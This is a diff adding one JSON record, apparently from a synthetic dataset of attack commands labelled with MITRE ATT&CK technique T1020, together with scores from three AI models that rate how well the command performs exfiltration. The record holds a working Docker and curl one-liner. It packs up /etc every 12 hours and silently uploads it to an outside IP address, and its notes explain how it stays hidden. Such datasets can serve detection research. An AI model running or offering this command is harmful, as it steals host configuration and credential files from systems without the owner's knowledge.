@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_etc --network host -e HN=$(hostname) -v /etc:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -k -X PUT -H \"Content-Type: application/gzip\" --data-binary @- \"https://203.0.113.15/upload/$HN/etc_$TS.tgz\"; sleep 43200; done'",
+  "explanation": "Every 12 hours, quietly compresses /etc and exfiltrates via HTTPS PUT, leveraging host networking and minimal output.",
+  "rationale_steps": [
+    "Mounts /etc for read-only access to configuration data",
+    "Automates timing with a sleep-based loop",
+    "Uses HTTPS to blend with normal traffic and -s to remain silent",
+    "Runs detached with host network for reliability and stealth"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-0472a6a2",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Docker command with balanced quoting and valid flags; the sh loop, pipes, and variable expansions are correctly structured.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements automated 12-hour compression and HTTPS PUT exfiltration of /etc consistent with T1020, but assumes reachability of 203.0.113.15, availability of sh/tar in the image, and sufficient Docker/host permissions.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:30:52.261708Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Docker and curl flags, and correct shell syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a persistent Docker container that regularly compresses sensitive /etc files and exfiltrates them via HTTPS to a remote server on a scheduled basis (every 12 hours).",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:30:54.998626Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and proper syntax for Docker, Bash loops, tar, and curl.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves automated exfiltration by silently compressing the /etc directory and repeatedly sending it via HTTPS PUT to an external IP, leveraging host networking and containerization as described by T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:05:23.340306Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
